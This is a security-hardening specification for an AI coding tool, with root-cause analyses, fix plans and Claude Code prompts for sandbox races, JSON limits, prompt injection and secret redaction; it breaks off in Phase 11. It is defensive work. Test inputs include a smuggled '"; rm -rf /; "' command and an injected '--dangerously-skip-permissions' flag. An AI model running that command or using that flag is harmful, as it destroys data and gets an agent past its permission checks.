---
version: 1.0.0
status: Draft
date: 2026-03-19
author: Claude Opus 4.6 (spec generation), Clay Good (review)
depends_on: ["16_reliability_test_coverage_v1.md", "15_parallel_agentic_loops_v1.md", "08_hardening_reliability_v1.md"]
related_specs: ["00_master_spec.md", "07_sandbox_security_hardening.md", "13_bulletproof_mvp_v1.md", "14_hardening_v2.md"]
supersedes: []
---

# spec-17: Security Closure, Quality Hardening, and MVP Launch Readiness

## 1. Executive Summary

This spec addresses every remaining open deficiency in the codelicious codebase. After 16 prior
specifications, the project has 564 passing tests, zero lint violations, a 9-layer security model,
and dual-engine architecture. However, a thorough audit reveals 6 open P1 critical findings, 11 open
P2 important findings, 3 test files with collection errors, 8 source modules without dedicated test
coverage, incomplete credential redaction, race conditions in the sandbox, and gaps in CI enforcement.

This spec does not introduce new features. Every phase fixes a real, measured deficiency in the
existing codebase. The goal is to reach:

- Zero P1 critical findings
- Zero P2 important findings
- All test files collecting and passing (zero collection errors)
- 90%+ line coverage measured and enforced in CI
- Pre-commit hooks for lint, format, and security
- Complete credential redaction coverage
- Thread-safe sandbox operations with no race windows
- Updated documentation reflecting the true current state

### Motivation

The codebase has been through 16 rounds of specification and implementation. Specs 01-06 built
features. Specs 07-08 hardened security and reliability. Specs 09-14 iterated on bulletproofing.
Spec-15 added parallel execution. Spec-16 planned comprehensive test coverage and CI gates. Despite
this, a deep audit on 2026-03-19 documented in STATE.md shows that 6 P1 and 11 P2 findings remain
open, 3 test files fail to collect, and 8 source modules lack dedicated tests. This spec
systematically closes every gap.

### Codebase Metrics (Measured 2026-03-19, Post-Spec-08 Phase 16)

| Metric | Current Value | Target After This Spec |
|--------|---------------|------------------------|
| Source modules | 30 in src/codelicious/ | 30 (no new modules) |
| Source lines | ~8,450 | ~8,800 (+350 net for fixes, no new features) |
| Passing tests | 564 (100% pass rate, 4.33s) | 700+ (all collecting, all passing) |
| Test collection errors | 3 files | 0 |
| P1 critical findings | 6 open | 0 |
| P2 important findings | 11 open | 0 |
| P3 minor findings | 18+ open | Under 5 remaining |
| Line coverage (measured) | Not enforced | 90%+ enforced in CI |
| Pre-commit hooks | None | lint + format + security |
| Runtime dependencies | 0 (stdlib only) | 0 (unchanged) |
| CI quality gates | 4 (lint, format, test, security) | 6 (+coverage, +pre-commit validation) |

### Logic Breakdown (Post-Spec-17)

| Category | Estimated Lines | Percentage | Description |
|----------|-----------------|------------|-------------|
| Deterministic safety harness | ~3,900 | 44% | sandbox, verifier, command_runner, fs_tools, audit_logger, security_constants |
| Probabilistic LLM-driven | ~3,600 | 41% | planner, executor, llm_client, agent_runner, loop_controller, prompts, context_manager, rag_engine, engines |
| Shared infrastructure | ~1,300 | 15% | cli, logger, cache_engine, tools/registry, config, errors, git_orchestrator, build_logger, progress |

The deterministic safety harness grows slightly as race conditions are closed and validation is
tightened, while the probabilistic layer stays constant (no new LLM features).

---

## 2. Scope and Non-Goals

### In Scope

1. Fix all 6 remaining P1 critical security findings (P1-2, P1-4, P1-5, P1-6, P1-8, P1-9, P1-11).
2. Fix all 11 remaining P2 important findings (P2-3, P2-5, P2-6, P2-7, P2-8, P2-9, P2-10, P2-11,
   P2-12, P2-13, P2-NEW-1, P2-NEW-2).
3. Fix all 3 test collection errors (test_scaffolder_v9.py, test_security_audit.py, test_verifier.py).
4. Add dedicated tests for all 8 untested source modules (cli.py, agent_runner.py, planner.py,
   config.py, budget_guard.py, _io.py, scaffolder.py, prompts.py).
5. Replace magic numbers with named constants across all modules.
6. Standardize error handling (eliminate silent exception swallowing, use typed exceptions).
7. Add missing credential redaction patterns (SSH keys, NPM tokens, webhook URLs, Slack tokens).
8. Configure pytest-cov to measure and enforce 90%+ line coverage in CI.
9. Add pre-commit hook configuration (.pre-commit-config.yaml) for lint, format, and security.
10. Fix all P3 minor findings (missing type hints on public functions, inconsistent error handling).
11. Update STATE.md, README.md, and CLAUDE.md to reflect final state.
12. Generate sample test fixtures and dummy data for all edge case scenarios.
13. Validate all Mermaid diagrams in README.md render correctly.

### Non-Goals

1. New features. No new CLI flags, no new engines, no new tools.
2. Async/await rewrite. The system stays synchronous with thread-based parallelism.
3. New LLM providers. HuggingFace Router and Claude Code CLI remain the only backends.
4. Database migrations. SQLite schema for RAG stays unchanged.
5. API versioning. No public API exists yet.
6. License changes. MIT stays.
7. Performance optimization beyond fixing race conditions. No algorithmic rewrites.

---

## 3. Open Findings Inventory

This section catalogs every open finding from STATE.md with root cause analysis, fix strategy, and
acceptance criteria. Each finding maps to a specific phase in Section 4.

### 3.1 P1 Critical Findings (6 Open)

**P1-4: File count increment race in sandbox.py (lines 215-228, 349-350)**

- Root cause: The file count is incremented after the write completes, not atomically with the
  validation check. Between validation and increment, another thread can also pass validation,
  leading to the counter exceeding the 200-file limit.
- Fix strategy: Move the counter increment inside the lock-protected critical section, before the
  write. If the write fails, decrement the counter. This creates an atomic
  validate-increment-write-or-rollback cycle.
- Acceptance criteria: A concurrent test with 10 threads each writing 25 files must never exceed
  the 200-file limit. The counter must equal the actual number of files written.

**P1-5: Overwrite count bug in sandbox.py (line 349-350)**

- Root cause: The file counter increments even when overwriting an existing file. After 200
  overwrites of the same file, new file creation is blocked despite only 1 unique file existing.
- Fix strategy: Check whether the target path already exists before incrementing. Only increment
  for genuinely new files (path not in the written-files set).
- Acceptance criteria: Writing to the same path 300 times must succeed. The counter must reflect
  unique file paths, not total write operations.

**P1-6: Symlink TOCTOU gap in sandbox.py (lines 240-248)**

- Root cause: There is a time window between the symlink check (os.path.islink) and the atomic
  write (os.replace). An attacker could create a symlink in this window.
- Fix strategy: After os.replace, verify the final path is not a symlink using os.lstat. If it is,
  remove the file and raise SandboxViolationError. This closes the window by validating the
  post-condition rather than relying solely on the pre-condition.
- Acceptance criteria: A test that creates a symlink between validation and write must result in
  SandboxViolationError, not a successful write through the symlink.

**P1-8: Silent exception swallowing in cli.py (line 111-114)**

- Root cause: The PR transition failure is caught with bare `except Exception: pass`, hiding
  errors from the user. If the PR transition fails (network error, auth failure, rate limit), the
  user sees "Build completed successfully" with no indication that the PR was not updated.
- Fix strategy: Log the exception at WARNING level with the full message. Do not re-raise (the
  build itself succeeded), but ensure the user sees that PR transition failed.
- Acceptance criteria: When git_manager.transition_pr_to_review() raises any exception, the log
  must contain a WARNING-level message with the exception details. The exit code must still be 0
  (build succeeded).

**P1-9: JSON deserialization without size/depth limits in loop_controller.py (lines 95-96, 159)**

- Root cause: json.loads is called on config file content and LLM response bodies without checking
  the input size first. A malicious or corrupted file could contain deeply nested JSON or a
  multi-gigabyte string, causing memory exhaustion.
- Fix strategy: Add a size check before json.loads. Reject inputs larger than 10 MB for config
  files and 5 MB for LLM responses. For nested depth, use a simple recursive depth check after
  parsing (Python json module does not support depth limits natively, but a post-parse check is
  sufficient for crash prevention).
- Acceptance criteria: A 20 MB JSON file must be rejected with a clear error before parsing. A
  JSON object nested 200 levels deep must be rejected after parsing with a clear error.

**P1-11: Prompt injection to subprocess in agent_runner.py (line 105)**

- Root cause: The user-provided spec content is interpolated into a prompt string that is passed
  as a command-line argument to the claude subprocess. If the spec contains shell metacharacters
  or prompt injection patterns, they could alter the claude process behavior.
- Fix strategy: Sanitize the prompt by stripping control characters (ASCII 0-31 except newline
  and tab) and escaping any sequences that could be interpreted as command-line flags (strings
  starting with double dashes). Pass the prompt via stdin pipe rather than command-line argument
  where possible.
- Acceptance criteria: A spec containing `"; rm -rf /; "` and `--dangerously-skip-permissions`
  must not cause the claude subprocess to execute those commands or enable those flags. The spec
  content must arrive to claude as literal text.

### 3.2 P2 Important Findings (11 Open)

**P2-5: DoS via large directory tree in fs_tools.py (lines 100-117)**

- Root cause: list_directory walks the filesystem without depth or count limits. A repository with
  100,000 files or deeply nested symlink cycles could hang the process or exhaust memory.
- Fix strategy: Add max_depth (default 5) and max_entries (default 1000) parameters. Stop
  traversal when either limit is reached and return a truncation notice.
- Acceptance criteria: A directory tree 20 levels deep with 50,000 files must return within 2
  seconds and include at most 1000 entries plus a truncation message.

**P2-6: Race in directory creation in sandbox.py (line 277)**

- Root cause: os.makedirs is called outside the file write lock. Two threads creating files in the
  same new directory could race on mkdir.
- Fix strategy: Move os.makedirs inside the lock-protected critical section, or use exist_ok=True
  (already present) and verify the fix is sufficient under concurrent access.
- Acceptance criteria: 10 threads simultaneously creating files in the same new subdirectory must
  all succeed without OSError.

**P2-7: Silent chmod failure in sandbox.py (lines 365-370)**

- Root cause: os.chmod is called after file creation but the OSError is silently caught. On
  filesystems that do not support chmod (e.g., some network mounts), the file is created with
  default permissions and no warning is logged.
- Fix strategy: Log the chmod failure at WARNING level. Do not raise (the file was written
  successfully), but ensure the audit trail records the permission issue.
- Acceptance criteria: When os.chmod raises OSError, the log must contain a WARNING with the file
  path and error message.

**P2-8: Command injection edge cases in verifier.py (lines 810-817)**

- Root cause: The verifier constructs subprocess commands by joining strings. While command_runner
  blocks newlines, the verifier has its own subprocess.run calls that do not apply the same
  metacharacter filtering.
- Fix strategy: Route all subprocess execution in verifier.py through a shared helper that applies
  the same BLOCKED_METACHARACTERS check used by command_runner. Alternatively, ensure all
  subprocess.run calls in verifier.py use shell=False with pre-split argument lists.
- Acceptance criteria: Every subprocess.run call in verifier.py must use shell=False and must not
  contain any string concatenation or format-string construction of command arguments.

**P2-9: Secret detection gaps in verifier.py (lines 459-468)**

- Root cause: The security scanner detects common patterns (API keys, passwords) but misses
  base64-encoded secrets, hex-encoded secrets, and provider-specific tokens (Slack xoxb, Stripe
  sk_live, Twilio AC/SK).
- Fix strategy: Add detection patterns for base64 strings longer than 40 characters adjacent to
  sensitive variable names, Slack bot tokens (xoxb-), Stripe secret keys (sk_live_), and Twilio
  credentials (AC, SK prefixes with 32-character hex).
- Acceptance criteria: A test file containing each of the following must trigger a security
  warning: `slack_token = "xoxb-1234-5678-abcdef"`, `stripe_key = "sk_live_abc123"`,
  `twilio_sid = "AC" + "a" * 32`.

**P2-10: Timeout overrun in agent_runner.py (lines 410-434)**

- Root cause: The agent_runner polls the subprocess with a sleep loop. Each sleep cycle adds up to
  1 second beyond the configured timeout before the kill signal is sent.
- Fix strategy: Use subprocess.communicate(timeout=N) instead of a polling loop. This delegates
  timeout enforcement to the OS, which is precise to milliseconds.
- Acceptance criteria: A subprocess configured with a 5-second timeout must be killed within 5.5
  seconds (0.5s grace for OS scheduling).

**P2-11: Regex catastrophic backtracking in executor.py (line 254-256)**

- Root cause: The code extraction regex uses nested quantifiers that can cause exponential
  backtracking on pathological input (e.g., a long string of backticks without a closing fence).
- Fix strategy: Replace the regex with an atomic pattern using possessive quantifiers (if
  supported by the re module) or rewrite as a simple state-machine parser that scans for
  triple-backtick fences linearly.
- Acceptance criteria: Parsing a 1 MB string of repeated backticks must complete in under 1
  second. The existing test suite for code extraction must continue to pass.

**P2-12: Race in file creation in build_logger.py (lines 163-178)**

- Root cause: The log file is opened, then permissions are set afterward. Between open and chmod,
  the file is world-readable by default umask.
- Fix strategy: Set the process umask to 0o077 before opening the file, then restore it. Or use
  os.open with explicit mode flags (O_WRONLY | O_CREAT, 0o600) and wrap in a file object.
- Acceptance criteria: The log file must never be world-readable at any point during creation. A
  test using os.stat immediately after creation must show mode 0o600 or stricter.

**P2-13: Incomplete credential redaction in logger.py (lines 26-67)**

- Root cause: The redaction patterns cover OpenAI, GitHub, AWS, Anthropic, HuggingFace, Azure,
  GCP, JWT, and database URLs. But they miss SSH private keys, NPM tokens, Slack tokens, Stripe
  keys, Twilio credentials, and webhook URLs containing tokens.
- Fix strategy: Add patterns for SSH private key headers ("-----BEGIN RSA PRIVATE KEY-----"),
  NPM tokens (npm_), Slack tokens (xoxb-, xoxp-, xoxs-, xoxa-), Stripe keys (sk_live_,
  pk_live_, rk_live_), Twilio credentials (AC followed by 32 hex chars), and webhook URLs
  containing /hooks/ or /webhooks/ with token query parameters.
- Acceptance criteria: Each new pattern must have a dedicated unit test. The sanitize_message
  function must redact all of the above when they appear in log messages.

**P2-NEW-1: Missing timeout on git push in git_orchestrator.py (lines 164-168)**

- Root cause: git push is called via subprocess.run without a timeout parameter. If the remote is
  unreachable or the push hangs (large repo, slow network), the process blocks indefinitely.
- Fix strategy: Add timeout=300 (5 minutes) to the git push subprocess.run call. On timeout,
  raise GitOperationError with a clear message.
- Acceptance criteria: A mocked git push that sleeps for 10 seconds with a 2-second timeout must
  raise GitOperationError within 3 seconds.

**P2-NEW-2: subprocess.run without process group in verifier.py (lines 190-196, 262-278)**

- Root cause: The verifier calls subprocess.run for pytest, ruff, and bandit without
  start_new_session=True. If the subprocess spawns children (pytest does), a timeout kill only
  terminates the parent, leaving orphaned children.
- Fix strategy: Add start_new_session=True to all subprocess.run/Popen calls in verifier.py. On
  timeout, use os.killpg to terminate the entire process group.
- Acceptance criteria: A test subprocess that spawns a child process must have both parent and
  child terminated when the timeout is reached.

---

## 4. Implementation Phases

Each phase is a self-contained unit of work that can be implemented, tested, and verified
independently. Phases are ordered by dependency and criticality (P1 fixes first, then P2, then
quality improvements).

### Phase 1: Fix Silent Exception Swallowing in cli.py (P1-8)

**What changes:**
Replace the bare `except Exception: pass` on line 113-114 of cli.py with a logged warning.

**Files modified:**
- src/codelicious/cli.py (2 lines changed)
- tests/test_cli.py (new file, 8-12 tests)

**Intent:**
As a developer running `codelicious /path/to/repo --push-pr`, when the build succeeds but the PR
transition fails (network error, auth failure, rate limit), I expect to see a warning message in the
terminal output explaining that the PR was not transitioned. The build should still exit with code 0
because the code changes were committed successfully.

**Claude Code Prompt:**
```
Read src/codelicious/cli.py. On lines 111-114, replace the bare `except Exception: pass` with
`except Exception as exc:` followed by `logger.warning("PR transition failed (build still
succeeded): %s", exc)`. Do not change the exit code or the surrounding logic.

Then create tests/test_cli.py with tests that:
1. Verify main() exits 0 on successful build (mock select_engine, GitManager, CacheManager)
2. Verify main() exits 1 when repo_path does not exist
3. Verify main() exits 1 when select_engine raises RuntimeError
4. Verify main() exits 1 when engine.run_build_cycle returns result.success=False
5. Verify main() exits 130 on KeyboardInterrupt
6. Verify main() exits 1 on unhandled Exception
7. Verify that when transition_pr_to_review raises, a WARNING is logged but exit code is 0
8. Verify main() calls git_manager.assert_safe_branch()

Run `pytest tests/test_cli.py -v` and `ruff check src/codelicious/cli.py tests/test_cli.py`.
```

**Acceptance criteria:**
- The bare except is replaced with a logged warning.
- test_cli.py has 8+ tests, all passing.
- Zero lint violations.

---

### Phase 2: Fix File Count Race and Overwrite Bug in sandbox.py (P1-4, P1-5)

**What changes:**
Refactor the write_file method in sandbox.py to increment the file counter atomically within the
lock, and only for genuinely new files.

**Files modified:**
- src/codelicious/sandbox.py (~30 lines changed in write_file method)
- tests/test_sandbox.py (6-10 new tests)

**Intent:**
As the sandbox enforcing file count limits, when 10 concurrent threads each attempt to write 25
unique files (250 total), the sandbox must reject writes that would exceed the 200-file limit. When
a file is overwritten, the counter must not increment. Writing the same file 300 times must succeed
because only 1 unique file exists.

**Claude Code Prompt:**
```
Read src/codelicious/sandbox.py. Find the write_file method and its file count logic.

Refactor the critical section as follows:
1. Inside the lock, before writing, check if the resolved path is already in self._written_paths
   (a set, add this attribute in __init__ if it does not exist).
2. If the path is new AND self._file_count >= self._max_files, raise FileCountLimitError.
3. If the path is new, increment self._file_count and add the path to self._written_paths.
4. Then perform the atomic write (tempfile + os.replace).
5. If the write fails, decrement self._file_count and remove from self._written_paths.

The validate-increment-write-or-rollback cycle must all happen inside the same lock acquisition.

Add tests to tests/test_sandbox.py:
1. test_file_count_concurrent_threads: 10 threads x 25 files, assert counter <= 200
2. test_overwrite_does_not_increment_counter: write same path 300 times, assert counter == 1
3. test_file_count_rollback_on_write_failure: mock os.replace to raise, assert counter unchanged
4. test_written_paths_tracking: write 5 unique files, assert _written_paths has 5 entries
5. test_concurrent_overwrite_same_file: 10 threads overwriting same file, assert counter == 1

Run `pytest tests/test_sandbox.py -v` and `ruff check src/codelicious/sandbox.py`.
```

**Acceptance criteria:**
- File count never exceeds max_files under concurrent access.
- Overwriting does not increment the counter.
- Failed writes roll back the counter.
- All existing sandbox tests still pass.

---

### Phase 3: Close Symlink TOCTOU Gap in sandbox.py (P1-6)

**What changes:**
Add a post-write symlink verification after os.replace in sandbox.py.

**Files modified:**
- src/codelicious/sandbox.py (~10 lines added after os.replace call)
- tests/test_sandbox.py (3-4 new tests)

**Intent:**
As the sandbox preventing symlink attacks, after the atomic write completes, the sandbox must verify
that the final file path is not a symlink. If a symlink was created in the window between validation
and write, the sandbox must remove the file and raise SandboxViolationError.

**Claude Code Prompt:**
```
Read src/codelicious/sandbox.py. Find the os.replace call in write_file.

Immediately after os.replace(temp_path, resolved_path), add:
1. Use os.lstat(resolved_path) to get file info without following symlinks.
2. Check if stat.S_ISLNK(lstat_result.st_mode) is True.
3. If it is a symlink, call os.unlink(resolved_path), decrement the file counter if it was a new
   file, and raise SandboxViolationError("Post-write symlink detected").

Add tests:
1. test_post_write_symlink_detection: mock os.lstat to return a symlink stat, assert
   SandboxViolationError is raised and the file is removed.
2. test_normal_write_passes_lstat_check: a normal write must pass the lstat check.
3. test_post_write_cleanup_decrements_counter: verify counter is decremented when symlink detected.

Run `pytest tests/test_sandbox.py -v`.
```

**Acceptance criteria:**
- Post-write symlink check is in place.
- Symlink detection raises SandboxViolationError.
- File counter is correctly decremented on symlink detection.

---

### Phase 4: Add JSON Size and Depth Limits (P1-9)

**What changes:**
Add safe_json_loads utility function with size and depth validation.

**Files modified:**
- src/codelicious/loop_controller.py (~15 lines changed)
- src/codelicious/config.py (~5 lines changed if json.loads is used there)
- tests/test_loop_controller.py (4-6 new tests)

**Intent:**
As the system loading JSON from config files and LLM responses, when a file exceeds 10 MB or a
parsed object exceeds 100 levels of nesting depth, the system must reject it with a clear error
message before the data can cause memory exhaustion or stack overflow.

**Claude Code Prompt:**
```
Read src/codelicious/loop_controller.py. Find all json.loads calls.

Create a helper function safe_json_loads(raw: str, max_bytes: int = 10_485_760, max_depth: int =
100) -> Any at the top of the module:
1. Check len(raw.encode("utf-8")) > max_bytes. If so, raise ValueError with message including
   the actual size and the limit.
2. Call json.loads(raw) to parse.
3. Call a recursive _check_depth(obj, current=0, limit=max_depth) function that walks dicts and
   lists. If depth exceeds limit, raise ValueError.
4. Return the parsed object.

Replace all json.loads(content) calls in loop_controller.py with safe_json_loads(content).
Also check config.py for any json.loads calls and replace those too.

Add tests:
1. test_safe_json_loads_normal: valid JSON parses correctly
2. test_safe_json_loads_too_large: 20 MB string raises ValueError
3. test_safe_json_loads_too_deep: 200-level nested dict raises ValueError
4. test_safe_json_loads_at_limit: 100-level nested dict parses successfully
5. test_safe_json_loads_invalid_json: malformed JSON raises json.JSONDecodeError

Run `pytest tests/test_loop_controller.py -v`.
```

**Acceptance criteria:**
- All json.loads calls in loop_controller.py and config.py use safe_json_loads.
- Oversized and deeply nested JSON is rejected.
- Valid JSON continues to parse correctly.

---

### Phase 5: Sanitize Prompt Injection to Agent Runner (P1-11)

**What changes:**
Add prompt sanitization in agent_runner.py before passing user content to the claude subprocess.

**Files modified:**
- src/codelicious/agent_runner.py (~20 lines added)
- tests/test_agent_runner.py (new file, 10-15 tests)

**Intent:**
As the agent_runner spawning a claude subprocess, when a user-provided spec contains shell
metacharacters, CLI flag injection attempts (--dangerously-skip-permissions), or control characters,
the content must be sanitized to literal text before being passed to the subprocess.

**Claude Code Prompt:**
```
Read src/codelicious/agent_runner.py. Find where the prompt or spec content is passed to the
subprocess command.

Add a _sanitize_prompt(text: str) -> str method:
1. Strip ASCII control characters (0x00-0x1F) except newline (0x0A) and tab (0x09).
2. Replace any occurrence of "--" at the start of a line with "- -" to prevent CLI flag injection.
3. Limit total prompt length to 500,000 characters (truncate with a notice if exceeded).

Apply _sanitize_prompt to all user-provided content before it reaches subprocess.Popen args or
stdin.

Create tests/test_agent_runner.py with tests:
1. test_sanitize_strips_control_chars: input with null bytes, bell chars, etc.
2. test_sanitize_prevents_flag_injection: input with "--dangerously-skip-permissions"
3. test_sanitize_preserves_newlines_and_tabs: normal formatting preserved
4. test_sanitize_truncates_long_input: 600,000 char input truncated to 500,000
5. test_sanitize_normal_spec_unchanged: typical markdown spec passes through unchanged
6. test_agent_runner_init: verify constructor sets expected attributes
7. test_agent_runner_uses_shell_false: verify subprocess calls use shell=False
8. test_agent_runner_timeout_behavior: verify timeout is applied correctly
9. test_agent_runner_stream_parsing: verify stdout stream is parsed correctly
10. test_agent_runner_error_handling: verify errors are caught and reported

Run `pytest tests/test_agent_runner.py -v`.
```

**Acceptance criteria:**
- Control characters are stripped.
- CLI flag injection is neutralized.
- Normal spec content passes through unchanged.
- All subprocess calls use shell=False.

---

### Phase 6: Fix DoS via Large Directory in fs_tools.py (P2-5)

**What changes:**
Add max_depth and max_entries parameters to list_directory in fs_tools.py.

**Files modified:**
- src/codelicious/tools/fs_tools.py (~15 lines changed)
- tests/test_fs_tools.py (4-5 new tests)

**Intent:**
As the file system tools listing directories for the LLM, when the LLM requests a directory listing
of a repository with 50,000 files or 20 levels of nesting, the tool must return within 2 seconds
with at most 1000 entries and a truncation notice, rather than hanging or exhausting memory.

**Claude Code Prompt:**
```
Read src/codelicious/tools/fs_tools.py. Find the list_directory function.

Add parameters max_depth=5 and max_entries=1000. Modify the traversal to:
1. Track current depth during recursion or os.walk.
2. Stop descending when depth exceeds max_depth.
3. Count entries and stop when max_entries is reached.
4. Append a truncation notice: "[Truncated: {total_found} entries found, showing first
   {max_entries}. Use a more specific path to see deeper.]"

Add tests:
1. test_list_directory_respects_max_depth: create 10-level deep tree, max_depth=3, verify no
   entries beyond depth 3
2. test_list_directory_respects_max_entries: create 2000 files, max_entries=500, verify at most
   500 entries returned
3. test_list_directory_truncation_notice: verify truncation message appears when limits hit
4. test_list_directory_normal_small_tree: small directory returns all entries

Run `pytest tests/test_fs_tools.py -v`.
```

**Acceptance criteria:**
- Large directories are bounded by depth and count limits.
- Truncation notice is included when limits are hit.
- Small directories return all entries unchanged.

---

### Phase 7: Fix Race Conditions in sandbox.py and build_logger.py (P2-6, P2-7, P2-12)

**What changes:**
Move directory creation inside the lock, log chmod failures, and fix file creation permissions in
build_logger.py.

**Files modified:**
- src/codelicious/sandbox.py (~5 lines moved/changed)
- src/codelicious/build_logger.py (~10 lines changed)
- tests/test_sandbox.py (2 new tests)
- tests/test_build_logger.py (2 new tests)

**Intent:**
As the system creating files and directories concurrently, all filesystem operations that modify
shared state must be serialized under a lock. Log files must be created with restrictive permissions
from the start, not set after creation.

**Claude Code Prompt:**
```
Read src/codelicious/sandbox.py. Find the os.makedirs call. If it is outside the lock, move it
inside the lock-protected critical section (it already uses exist_ok=True, so concurrent calls
inside the lock are safe).

Find the os.chmod call in sandbox.py. If the except clause is empty (pass), replace with:
logger.warning("Failed to set permissions on %s: %s", path, exc)

Read src/codelicious/build_logger.py. Find where log files are created. Replace the pattern of
open() followed by os.chmod() with:
1. fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
2. file_obj = os.fdopen(fd, "a")
This creates the file with 0o600 permissions atomically.

Add tests:
1. test_sandbox_concurrent_mkdir: 10 threads creating files in same new dir, all succeed
2. test_sandbox_chmod_failure_logged: mock os.chmod to raise, verify WARNING logged
3. test_build_logger_file_permissions: after creation, os.stat shows mode 0o600
4. test_build_logger_atomic_creation: file is never world-readable during creation

Run `pytest tests/test_sandbox.py tests/test_build_logger.py -v`.
```

**Acceptance criteria:**
- Directory creation is inside the lock.
- chmod failures are logged at WARNING level.
- Build log files are created with 0o600 from the start.

---

### Phase 8: Fix Command Injection in verifier.py and Add Git Push Timeout (P2-8, P2-NEW-1, P2-NEW-2)

**What changes:**
Ensure all subprocess calls in verifier.py use shell=False with pre-split args and
start_new_session=True. Add timeout to git push.

**Files modified:**
- src/codelicious/verifier.py (~20 lines changed across multiple subprocess.run calls)
- src/codelicious/git/git_orchestrator.py (~3 lines changed)
- tests/test_verifier.py (fix collection errors + 3 new tests)
- tests/test_git_orchestrator.py (2 new tests)

**Intent:**
As the verifier running pytest, ruff, and bandit, all subprocess invocations must use shell=False
with argument lists (not strings), start_new_session=True for clean timeout kill, and
os.killpg on timeout. As the git orchestrator pushing code, the push must have a 300-second
timeout.

**Claude Code Prompt:**
```
Read src/codelicious/verifier.py. Find ALL subprocess.run and subprocess.Popen calls.

For each call:
1. If the command is passed as a string, convert to a list of arguments.
2. Ensure shell=False is explicit.
3. Add start_new_session=True.
4. If there is a timeout, add an except subprocess.TimeoutExpired handler that calls
   os.killpg(proc.pid, signal.SIGKILL).

Read src/codelicious/git/git_orchestrator.py. Find the git push subprocess.run call. Add
timeout=300. Add an except subprocess.TimeoutExpired handler that raises
GitOperationError("git push timed out after 300 seconds").

Fix tests/test_verifier.py collection errors (read the file first to diagnose the import or
fixture issue, then fix it).

Add tests:
1. test_verifier_subprocess_shell_false: verify all subprocess calls use shell=False
2. test_verifier_subprocess_process_group: verify start_new_session=True is used
3. test_verifier_timeout_kills_process_group: mock a hanging subprocess, verify os.killpg called
4. test_git_push_timeout: mock subprocess.run to raise TimeoutExpired, verify GitOperationError
5. test_git_push_success: mock successful push, verify no error

Run `pytest tests/test_verifier.py tests/test_git_orchestrator.py -v`.
```

**Acceptance criteria:**
- Zero string-based subprocess commands in verifier.py.
- All subprocess calls have start_new_session=True.
- git push has a 300-second timeout.
- test_verifier.py collection errors are fixed and all tests pass.

---

### Phase 9: Expand Secret Detection and Credential Redaction (P2-9, P2-13)

**What changes:**
Add missing credential patterns to both verifier.py (security scanner) and logger.py (log
redaction).

**Files modified:**
- src/codelicious/verifier.py (~15 lines added to security scanner patterns)
- src/codelicious/logger.py (~20 lines added to _REDACT_PATTERNS)
- tests/test_verifier.py (5 new tests)
- tests/test_logger.py (new file, 12-15 tests for each redaction pattern)

**Intent:**
As the security scanner and log redactor, the following credential types must be detected and
redacted: SSH private key headers, NPM tokens (npm_), Slack tokens (xoxb-, xoxp-, xoxs-, xoxa-),
Stripe keys (sk_live_, pk_live_, rk_live_), Twilio credentials (AC + 32 hex), and webhook URLs
containing token parameters.

**Claude Code Prompt:**
```
Read src/codelicious/logger.py. Add the following patterns to _REDACT_PATTERNS:

1. SSH private keys: re.compile(r"-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----")
2. NPM tokens: re.compile(r"\bnpm_[a-zA-Z0-9]{20,}\b")
3. Slack tokens: re.compile(r"\bxox[bpsa]-[a-zA-Z0-9\-]{10,}\b")
4. Stripe secret keys: re.compile(r"\b[sr]k_live_[a-zA-Z0-9]{20,}\b")
5. Stripe publishable keys: re.compile(r"\bpk_live_[a-zA-Z0-9]{20,}\b")
6. Twilio Account SID: re.compile(r"\bAC[a-f0-9]{32}\b")
7. Twilio Auth Token: re.compile(r"\bSK[a-f0-9]{32}\b")
8. Webhook URLs with tokens: re.compile(r"https?://[^\s]*(?:hooks|webhooks)[^\s]*(?:token|key|secret)=[^\s&]+")

Read src/codelicious/verifier.py. Find the security scanning patterns (where it checks for
hardcoded secrets). Add equivalent detection patterns for the same credential types listed above.

Create tests/test_logger.py:
1. One test per pattern verifying sanitize_message redacts the credential
2. One test verifying normal text without credentials passes through unchanged
3. One test verifying multiple credentials in one message are all redacted
4. One test verifying partial matches are not redacted (e.g., "xox" alone)

Add tests to tests/test_verifier.py for each new secret detection pattern.

Run `pytest tests/test_logger.py tests/test_verifier.py -v`.
```

**Acceptance criteria:**
- All 8 new credential types are redacted in logs.
- All 8 new credential types trigger security warnings in the verifier.
- Normal text is not affected.
- Each pattern has a dedicated unit test.

---

### Phase 10: Fix Regex Catastrophic Backtracking in executor.py (P2-11)

**What changes:**
Replace the vulnerable regex in executor.py with a linear-time state-machine parser.

**Files modified:**
- src/codelicious/executor.py (~25 lines changed)
- tests/test_executor.py (3 new tests)

**Intent:**
As the code extractor parsing LLM output, when the output contains pathological patterns (e.g.,
1 MB of repeated backticks without a closing fence), the parser must complete in under 1 second
rather than hanging due to exponential backtracking.

**Claude Code Prompt:**
```
Read src/codelicious/executor.py. Find the regex that extracts code blocks from LLM output
(typically matching triple-backtick fences).

Replace the regex with a linear-time parser:
1. Split the text by lines.
2. Scan for lines starting with triple backticks.
3. When a fence-open line is found, record the language tag (if any).
4. Collect lines until a fence-close line (triple backticks alone or with trailing text).
5. Return the collected code blocks.

This approach is O(n) in the number of characters and cannot backtrack.

Add tests:
1. test_code_extraction_pathological_input: 1 MB of backticks, must complete in < 1 second
2. test_code_extraction_normal_fenced_block: standard markdown code block extracted correctly
3. test_code_extraction_multiple_blocks: multiple code blocks all extracted
4. test_code_extraction_no_blocks: text without code blocks returns empty list

Run `pytest tests/test_executor.py -v`.
```

**Acceptance criteria:**
- Pathological input completes in under 1 second.
- Normal code extraction still works.
- All existing executor tests pass.

---

### Phase 11: Fix Agent Runner Timeout Overrun (P2-10)

**What changes:**
Replace the polling loop in agent_runner.py with subprocess.communicate(timeout=N).

**Files modified:**
- src/codelicious/agent_runner.py (~15 lines changed)
- tests/test_agent_runner.py (3 new tests added to existing file from Phase 5)

**Intent:**
As the agent runner managing the claude subprocess, when the configured timeout is reached, the
subprocess must be killed within 0.5 seconds (OS scheduling grace), not after an additional 1-second
polling sleep.

**Claude Code Prompt:**
```
Read src/codelicious/agent_runner.py. Find the polling/sleep loop that checks subprocess status.

Replace it with:
1. proc = subprocess.Popen(args, stdout=PIPE, stderr=PIPE, start_new_session=True, ...)
2. try: stdout, stderr = proc.communicate(timeout=self.timeout)
3. except subprocess.TimeoutExpired:
   os.killpg(proc.pid, signal.SIGKILL)
   proc.communicate(timeout=5)  # collect zombie
   raise AgentTimeout(f"Claude agent timed out after {self.timeout}s")

Add tests to tests/test_agent_runner.py:
